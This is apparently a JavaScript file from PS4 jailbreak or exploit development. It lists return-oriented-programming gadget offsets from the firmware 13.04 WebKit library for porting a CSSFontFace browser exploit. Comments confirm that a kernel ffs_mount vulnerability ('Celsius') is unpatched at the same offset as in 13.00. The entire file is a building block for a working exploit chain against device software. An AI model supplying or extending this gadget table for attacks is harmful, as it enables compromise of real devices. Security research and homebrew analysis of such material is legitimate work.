// WebKit ROP Gadgets — PS4 Firmware 13.04
// Source: 1304_libSceNKWebKit.sprx.decrypted (68 MB) from zecoxao
// Found using Python byte pattern search
// For use with CSSFontFace exploit (ntfargo) porting

const webkit_gadgets_1304 = {
  wk_RET:               0x004032,
  wk_LEAVE_RET:         0x01c2f7,
  wk_POP_RAX_RET:       0x014504,
  wk_POP_RBX_RET:       0x00b9e8,
  wk_POP_RCX_RET:       0x01fade,
  wk_POP_RDI_RET:       0x060480,
  wk_POP_RDX_RET:       0x1305ba,
  wk_POP_RSI_RET:       0x07245e,
  wk_POP_RBP_RET:       0x0040b6,
  wk_POP_RSP_RET:       0x073017,
  wk_POP_R8_RET:        0x230cbe1,
  wk_POP_R9_RET:        0x9df883,
  wk_POP_R12_RET:       0x242ab15,
  wk_POP_R13_R14_R15_RET: 0x06047b,
  wk_POP_R14_RET:       0x0a9e91,
  wk_POP_R15_RET:       0x06047f,
};

// Kernel comparison: 13.00 vs 13.04
// Same size: 20,080,104 bytes
// ffs_mountfs string at 0x7d021f in BOTH (Celsius NOT patched)
// 27.79% bytes different (216,403 regions)
// Most changes are small 1-2 byte patches

// CONFIRMED: Celsius (ffs_mount) is present in 13.04 kernel
// The vulnerable function exists at the same offset as 13.00

